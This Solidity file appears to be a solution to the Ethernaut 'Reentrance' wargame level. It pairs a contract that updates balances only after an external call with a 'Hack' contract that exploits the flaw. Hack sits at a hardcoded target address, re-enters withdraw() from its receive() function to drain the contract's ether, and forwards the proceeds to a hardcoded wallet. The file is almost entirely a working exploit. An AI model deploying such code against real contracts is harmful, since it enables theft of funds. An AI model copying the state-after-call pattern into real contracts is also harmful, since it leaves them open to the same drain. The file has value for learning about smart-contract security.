// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Hack {
    address payable target = payable(0xa7B6f4Ca1D75a987bC1aC27C2AdA78EDfB164084);
    Reentrance re = Reentrance(target);

    function attack() public payable {
        re.donate{value: 1000000000000000 wei}(address(this));
        re.withdraw(100000000000000);
    }

    function reFund() public payable {
        address payable myWallet = 0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65;
        require(address(this).balance > 0);
        (bool success,) = payable(myWallet).call{value: address(this).balance}("");
        require (success,"reFund failed");
    }

    function getBalance() public view returns(uint256){
        return re.balanceOf(address(this));
    }

    function getEthAmount() public view returns(uint256){
        return address(this).balance;
    }
    


    receive() external payable{
        uint256 bal = re.balanceOf(address(this));
        if (bal > 0) {
            if(address(target).balance > 100000000000000)
                re.withdraw(100000000000000);
            else
                re.withdraw(address(target).balance);
        }
    }

}